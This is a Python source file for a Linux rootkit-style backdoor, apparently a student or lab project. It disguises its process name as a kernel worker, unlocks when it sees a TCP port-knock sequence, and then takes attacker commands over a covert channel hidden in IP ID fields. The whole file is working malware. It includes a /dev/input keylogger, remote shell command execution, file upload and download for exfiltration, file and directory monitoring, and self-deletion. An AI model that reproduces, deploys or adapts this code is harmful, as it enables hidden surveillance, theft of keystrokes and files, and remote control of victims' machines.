import json
import os
import sys
import socket
import struct
import threading
import ctypes
import subprocess
import time

# Configuration
KNOCK_SEQUENCE = [12345, 23456, 34567]  # must match commander
COVERT_UDP_PORT = 40000  # port to monitor for covert UDP packets (match commander)
ATTACKER_IP = None  # Will be set after knock success

# Global state
keylog_active = False
keylog_data = []  # store captured keystrokes
keylog_thread = None

mon_file_path = None
mon_file_thread = None
mon_file_events = []  # store file change events

mon_dir_path = None
mon_dir_thread = None
mon_dir_events = []  # store directory change events

# Lock for logging data structures
data_lock = threading.Lock()


def get_local_ip(dest_ip, dest_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 用 Victim 的 UDP 端口（这里用 COVERT_UDP_PORT）来探路
    s.connect((dest_ip, dest_port))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip


def hide_process():
    """Hide process by changing its name."""
    try:
        libc = ctypes.CDLL("libc.so.6")
        PR_SET_NAME = 15
        # Set name to something innocuous (limited to 16 bytes)
        libc.prctl(PR_SET_NAME, ctypes.c_char_p(b"kworker/0:1"), 0, 0, 0)
    except Exception:
        pass  # if this fails, not critical


def start_keylogger():
    """Start a thread to capture keystrokes from /dev/input devices."""
    global keylog_active, keylog_thread
    if keylog_active:
        return "Keylogger already running."
    # Find a keyboard event device
    kb_device = None
    try:
        # Look for device with "Handlers...EV=120013" (keyboard event) in /proc/bus/input/devices
        with open("/proc/bus/input/devices", "r") as f:
            content = f.read()
        # Each device info separated by blank line
        devs = content.split("\n\n")
        for dev in devs:
            if "EV=120013" in dev or "EV=12001f" in dev:  # EV codes for keyboards
                for line in dev.splitlines():
                    if line.startswith("H:") and "Handlers" in line and "event" in line:
                        if "event" in line:
                            # Extract eventX
                            pos = line.find("event")
                            if pos != -1:
                                kb_device = "/dev/input/" + line[pos:pos + 7].strip()
                                break
            if kb_device:
                break
    except Exception as e:
        kb_device = None
    if not kb_device:
        return "Keylogger error: keyboard device not found."

    # Thread target function
    def log_keys(dev_path):
        global keylog_active
        try:
            # Open the input device in binary mode
            f = open(dev_path, "rb")
        except Exception as e:
            keylog_active = False
            return
        # Each input_event is 24 bytes: (time_sec, time_usec, type, code, value)
        # Here we read in chunks and parse the needed parts.
        while keylog_active:
            data = f.read(24)
            if not data or len(data) < 24:
                break
            _, _, type, code, value = struct.unpack('qqHHI', data)
            # type 1 = EV_KEY, value 1 = key press, value 0 = release
            if type == 1 and value == 1:
                with data_lock:
                    keylog_data.append(code)  # store key code
        f.close()

    # Start logging thread
    keylog_active = True
    keylog_thread = threading.Thread(target=log_keys, args=(kb_device,), daemon=True)
    keylog_thread.start()
    return "Keylogger started."


def stop_keylogger():
    """Stop the keylogging thread."""
    global keylog_active, keylog_thread
    if not keylog_active:
        return "Keylogger is not running."
    keylog_active = False
    if keylog_thread:
        keylog_thread.join(timeout=1.0)
    keylog_thread = None
    return "Keylogger stopped."


def get_keylog():
    """Retrieve and clear the keylog data (translate key codes to human-readable)."""
    with data_lock:
        codes = keylog_data.copy()
        keylog_data.clear()
    if not codes:
        return "(keylog is empty)"
    # Simple key code to char mapping for letters and digits (this is simplified)
    key_map = {  # partial map for common keys
        30: 'a', 48: 'b', 46: 'c', 32: 'd', 18: 'e', 33: 'f', 34: 'g', 35: 'h',
        23: 'i', 36: 'j', 37: 'k', 38: 'l', 50: 'm', 49: 'n', 24: 'o', 25: 'p',
        16: 'q', 19: 'r', 31: 's', 20: 't', 22: 'u', 47: 'v', 17: 'w', 45: 'x',
        21: 'y', 44: 'z',
        2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
        57: ' '  # space
    }
    output = ""
    for code in codes:
        if code in key_map:
            output += key_map[code]
        else:
            output += f"[{code}]"  # unknown code or special key
    return output


def monitor_file(path):
    try:
        last_mtime = os.path.getmtime(path)
    except Exception as e:
        send_covert_response(json.dumps({
            "type": "MON_FILE_ERROR",
            "path": path,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "error": str(e)
        }).encode() + b"\n")
        return

    # 通知监控已启动
    send_covert_response(json.dumps({
        "type": "MON_FILE_STARTED",
        "path": path,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }).encode() + b"\n")

    while mon_file_path == path:
        try:
            mtime = os.path.getmtime(path)
        except Exception:
            break
        if mtime != last_mtime:
            last_mtime = mtime
            send_covert_response(json.dumps({
                "type": "MON_FILE_MODIFIED",
                "path": path,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }).encode() + b"\n")
        time.sleep(1)


def monitor_directory(path):
    """Monitor a directory for any file creations/deletions using polling."""
    try:
        prev_contents = set(os.listdir(path))
    except Exception as e:
        msg = {
            "type": "MON_DIR_ERROR",
            "path": path,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
            "content": f"Directory {path} not accessible: {e}"
        }
        send_covert_response((json.dumps(msg) + "\n").encode())
        return

    while mon_dir_path == path:
        try:
            current_contents = set(os.listdir(path))
        except Exception as e:
            msg = {
                "type": "MON_DIR_ERROR",
                "path": path,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
                "content": f"Directory {path} inaccessible: {e}"
            }
            send_covert_response((json.dumps(msg) + "\n").encode())
            break

        # 新增文件
        for a in current_contents - prev_contents:
            ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            msg = {
                "type": "MON_DIR_ADDED",
                "path": path,
                "filename": a,
                "timestamp": ts
            }
            send_covert_response((json.dumps(msg) + "\n").encode())

        # 删除文件
        for r in prev_contents - current_contents:
            ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            msg = {
                "type": "MON_DIR_REMOVED",
                "path": path,
                "filename": r,
                "timestamp": ts
            }
            send_covert_response((json.dumps(msg) + "\n").encode())

        prev_contents = current_contents
        time.sleep(1)


def stop_monitor_file():
    """Stop file monitoring."""
    global mon_file_path, mon_file_thread
    if mon_file_path:
        mon_file_path = None  # signal thread to stop
        if mon_file_thread:
            mon_file_thread.join(timeout=1.0)
        mon_file_thread = None
        return "Stopped monitoring file."
    else:
        return "No file was being monitored."


def stop_monitor_directory():
    """Stop directory monitoring."""
    global mon_dir_path, mon_dir_thread
    if mon_dir_path:
        mon_dir_path = None
        if mon_dir_thread:
            mon_dir_thread.join(timeout=1.0)
        mon_dir_thread = None
        return "Stopped monitoring directory."
    else:
        return "No directory was being monitored."


def run_program(cmd):
    """Execute a command on the victim and return its output or error."""
    try:
        # Run the command with shell to allow complex commands
        completed = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        out = completed.stdout + completed.stderr
        if out == "":
            out = "(no output)"
        return out
    except Exception as e:
        return f"ERR: Failed to run command: {e}"


def uninstall_self():
    """Uninstall the rootkit: stop everything and remove files."""
    # Stop keylogger and monitors if running
    if keylog_active:
        stop_keylogger()
    if mon_file_path:
        stop_monitor_file()
    if mon_dir_path:
        stop_monitor_directory()
    # Remove log files if any (we didn't use persistent log files here; all in memory)
    # Remove the script file (self) if possible
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
    except Exception:
        pass
    # Send a confirmation to attacker (will do outside after calling this)
    # Exit the program
    os._exit(0)


def calc_checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = msg[i] << 8
        if i + 1 < len(msg):
            w += msg[i + 1]
        s += w
    s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xFFFF
    return s


def send_covert_response(data_bytes):
    """Send a response message back to attacker via covert channel (IP ID encoding)."""
    if ATTACKER_IP is None:
        return
    # Prepare raw socket for sending (separate from listener raw)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    # Prepend length as 2 bytes
    length = len(data_bytes)
    header = struct.pack(">H", length)
    message = header + data_bytes
    if len(message) % 2 != 0:
        message += b'\x00'
    # Use victim (this host) IP as source
    # src_ip = socket.gethostbyname(socket.gethostname())
    src_ip = get_local_ip(ATTACKER_IP, COVERT_UDP_PORT)
    dst_ip = ATTACKER_IP
    src_addr = socket.inet_aton(src_ip)
    dst_addr = socket.inet_aton(dst_ip)
    for i in range(0, len(message), 2):
        chunk = message[i:i + 2]
        if len(chunk) < 2:
            chunk += b'\x00'
        value = struct.unpack(">H", chunk)[0]
        # IP header
        ver_ihl = 0x45
        tos = 0
        total_len = 20 + 8
        identification = value
        flags_frag = 0
        ttl = 64
        proto = socket.IPPROTO_UDP
        ip_header = struct.pack(">BBHHHBBH4s4s",
                                ver_ihl, tos, total_len, identification,
                                flags_frag, ttl, proto, 0, src_addr, dst_addr)
        checksum = calc_checksum(ip_header)
        ip_header = struct.pack(">BBHHHBBH4s4s",
                                ver_ihl, tos, total_len, identification,
                                flags_frag, ttl, proto, checksum, src_addr, dst_addr)
        # UDP header
        src_port = 40000  # arbitrary source port on victim
        dst_port = 55555  # port on attacker (could be anything, not actually used by a socket)
        udp_len = 8
        udp_checksum = 0
        udp_header = struct.pack(">HHHH", src_port, dst_port, udp_len, udp_checksum)
        packet = ip_header + udp_header
        sock.sendto(packet, (dst_ip, 0))
    sock.close()


def main():
    global ATTACKER_IP, mon_file_path, mon_dir_path, mon_file_thread, mon_dir_thread
    # Hide the process name
    hide_process()
    # Open a raw socket to listen for TCP (for knocking) and UDP (for covert data)
    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        raw_sock.bind(("0.0.0.0", 0))  # bind not strictly needed for raw
    except PermissionError:
        print("Root privileges are required to run this rootkit.")
        sys.exit(1)
    raw_sock.settimeout(1.0)
    print("[*] Rootkit started, waiting for port knock sequence...")
    knock_index = 0
    # Wait for correct knock sequence
    while True:
        try:
            packet, addr = raw_sock.recvfrom(65535)
        except socket.timeout:
            continue
        src_ip = addr[0]
        # Parse TCP packet to get destination port and SYN flag
        # IP header is first 20 bytes (assuming no IP options)
        if len(packet) < 20:
            continue
        ip_header = packet[:20]
        ip_hdr = struct.unpack(">BBHHHBBH4s4s", ip_header)
        ip_proto = ip_hdr[6]
        if ip_proto != socket.IPPROTO_TCP:
            continue
        ip_len = (ip_hdr[0] & 0x0F) * 4
        tcp_header = packet[ip_len: ip_len + 20]  # 20 bytes of TCP header
        if len(tcp_header) < 20:
            continue
        tcp_hdr = struct.unpack(">HHLLBBHHH", tcp_header)
        dst_port = tcp_hdr[1]
        flags = tcp_hdr[5]
        syn_flag = flags & 0x02
        if syn_flag:
            # Check if this port matches the next in sequence
            if dst_port == KNOCK_SEQUENCE[knock_index]:
                knock_index += 1
                if knock_index == len(KNOCK_SEQUENCE):
                    ATTACKER_IP = src_ip
                    print(f"[*] Port knock sequence received from {src_ip}. Session unlocked.")
                    break  # exit knock listening loop
            else:
                # Reset sequence if wrong port
                knock_index = 0
    # Now switch raw socket to listen for UDP packets from ATTACKER_IP (covert channel)
    raw_sock.close()
    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    raw_sock.bind(("0.0.0.0", 0))
    raw_sock.settimeout(1.0)
    print("[*] Waiting for commands from attacker...")
    # Send an initial acknowledgment (pong) to confirm session establishment
    send_covert_response(b"PONG")
    # Command processing loop
    while True:
        try:
            packet, addr = raw_sock.recvfrom(65535)
        except socket.timeout:
            continue
        src_ip = addr[0]
        if src_ip != ATTACKER_IP:
            continue
        # Parse IP packet for UDP and extract IP ID
        if len(packet) < 20:
            continue
        ip_header = packet[:20]
        ip_fields = struct.unpack(">BBHHHBBH4s4s", ip_header)
        proto = ip_fields[6]
        if proto != socket.IPPROTO_UDP:
            continue
        ip_id = ip_fields[3]
        # Reconstruct message using IP IDs
        # We need to accumulate chunks similar to commander
        # We don't know how many packets per message up front until we read length from first chunk
        # One approach: since raw_sock.recvfrom returns one packet at a time, we need to assemble manually.
        # We'll do a simple approach: read multiple packets quickly to gather a full message.
        # This loop already is reading one packet. We will build message by continuing to read until done.
        # Start assembling message:
        # The first packet we got is part of a message.
        # Get first chunk from ip_id
        first_chunk = struct.pack(">H", ip_id)
        # Determine length from first two bytes
        expected_length = struct.unpack(">H", first_chunk)[0]
        data_bytes = b''
        # Now keep reading packets until we have 'expected_length' bytes
        while len(data_bytes) < expected_length:
            try:
                packet2, addr2 = raw_sock.recvfrom(65535)
            except socket.timeout:
                break
            if addr2[0] != ATTACKER_IP:
                continue
            ip_header2 = packet2[:20]
            ip_fields2 = struct.unpack(">BBHHHBBH4s4s", ip_header2)
            proto2 = ip_fields2[6]
            if proto2 != socket.IPPROTO_UDP:
                continue
            ip_id2 = ip_fields2[3]
            chunk_bytes = struct.pack(">H", ip_id2)
            data_bytes += chunk_bytes
        # Trim any padding
        data_bytes = data_bytes[:expected_length] if expected_length is not None else data_bytes
        if expected_length is None:
            continue  # if we never got a valid length, skip
        # We have a complete message in data_bytes
        # Process command
        try:
            command_str = data_bytes.decode('utf-8', errors='ignore')
        except Exception:
            command_str = ""  # if not decodable, treat as empty (should not happen in our usage)
        if not command_str:
            continue
        # Debug print (could log)
        # print(f"[DEBUG] Received command: {command_str}")
        # Identify and execute commands
        if command_str.startswith("CMD_PING"):
            send_covert_response(b"PONG")  # respond to ping
        elif command_str.startswith("CMD_DISCONNECT"):
            # Simply break out of loop to return to knock wait or idle.
            print("[*] Disconnect command received. Returning to knock wait.")
            break  # break out of command loop to essentially pause (we could implement re-knocking to resume)
        elif command_str.startswith("CMD_UNINSTALL"):
            # Send confirmation and uninstall
            send_covert_response(b"Uninstalling... bye.")
            uninstall_self()
            break  # should never reach here due to os._exit
        elif command_str.startswith("CMD_KEYLOG_START"):
            result = start_keylogger()
            send_covert_response(result.encode())
        elif command_str.startswith("CMD_KEYLOG_STOP"):
            result = stop_keylogger()
            send_covert_response(result.encode())
        elif command_str.startswith("CMD_GET_KEYLOG"):
            log = get_keylog()
            send_covert_response(log.encode())
        elif command_str.startswith("CMD_PUT:"):
            # Format: CMD_PUT:<path>:<size><file_bytes>
            # We already have the entire message including file bytes.
            # Extract the header and content.
            try:
                # separate header and content by first finding the end of header (which is after the colon following size)
                # e.g. CMD_PUT:/tmp/test.txt:1234
                parts = command_str.split(':', 2)
                # parts[0] = 'CMD_PUT', parts[1] = <path>, the rest contains <size> and possibly file bytes when decoded as str it's truncated.
                # Better to not rely on str for file content because binary could break. Instead, parse differently:
            except Exception as e:
                send_covert_response(f"ERR: Invalid PUT command format: {e}".encode())
            # A better approach: find the first two ':' in the raw bytes.
            parts = data_bytes.split(b':', 2)
            # parts[0]=b'CMD_PUT', parts[1]=b'<path>', parts[2]= b'<size><filecontent>'
            if len(parts) < 3:
                send_covert_response(b"ERR: PUT command parse error.")
            else:
                path = parts[1].decode(errors='ignore')
                # parts[2] starts with size until we hit the bytes of file. We know size as an ascii number, let's extract it.
                size_bytes = b''
                j = 0
                # read digits in parts[2] until non-digit (which would be start of file bytes)
                while j < len(parts[2]) and chr(parts[2][j]).isdigit():
                    size_bytes += bytes([parts[2][j]])
                    j += 1
                try:
                    file_size = int(size_bytes.decode()) if size_bytes else 0
                except:
                    file_size = 0
                file_content = parts[2][j:]  # remaining bytes after size
                if file_size != len(file_content):
                    # If sizes mismatch, maybe file content contained ':' which messed parsing
                    # As a fallback, consider everything after the second colon as file content (size might be just for info)
                    file_content = parts[2]
                # Write file
                try:
                    # Ensure directory exists
                    os.makedirs(os.path.dirname(path), exist_ok=True)
                    with open(path, "wb") as f:
                        f.write(file_content)
                    send_covert_response(f"File received ({len(file_content)} bytes) and saved to {path}".encode())
                except Exception as e:
                    send_covert_response(f"ERR: Failed to save file: {e}".encode())
        elif command_str.startswith("CMD_GET:"):
            # Format: CMD_GET:<path>
            parts = command_str.split(":", 1)
            if len(parts) < 2:
                send_covert_response(b"ERR: Invalid GET command.")
            else:
                filepath = parts[1]
                try:
                    with open(filepath, "rb") as f:
                        content = f.read()
                    # Send file content as response (might be large; our protocol handles chunking internally)
                    send_covert_response(content)
                except Exception as e:
                    err_msg = f"ERR: Cannot read file: {e}"
                    send_covert_response(err_msg.encode())
        elif command_str.startswith("CMD_MON_FILE:"):
            target = command_str.split(":", 1)[1]
            # If a monitor is already running, stop it first
            if mon_file_path:
                stop_monitor_file()
            mon_file_path = target
            mon_file_events.clear()
            mon_file_thread = threading.Thread(target=monitor_file, args=(target,), daemon=True)
            mon_file_thread.start()
        elif command_str.startswith("CMD_MON_DIR:"):
            target = command_str.split(":", 1)[1]
            if mon_dir_path:
                stop_monitor_directory()
            mon_dir_path = target
            mon_dir_events.clear()
            mon_dir_thread = threading.Thread(target=monitor_directory, args=(target,), daemon=True)
            mon_dir_thread.start()
            send_covert_response(f"Monitoring directory {target}".encode())
        elif command_str.startswith("CMD_RUN:"):
            cmd_to_run = command_str.split(":", 1)[1]
            result = run_program(cmd_to_run)
            send_covert_response(result.encode())
        elif command_str.startswith("CMD_FETCH_EVENTS"):
            with data_lock:
                events = mon_file_events + mon_dir_events
                mon_file_events.clear()
                mon_dir_events.clear()
            payload = "\n".join(events).encode() if events else b"No new events."
            send_covert_response(payload)
        else:
            # Unknown command
            send_covert_response(f"ERR: Unknown command {command_str}".encode())

    # If loop breaks (disconnect), we can either exit or go back to waiting for knock
    # Here, we'll simply exit the program for simplicity, but could reset state and wait again.
    sys.exit(0)


if __name__ == "__main__":
    main()
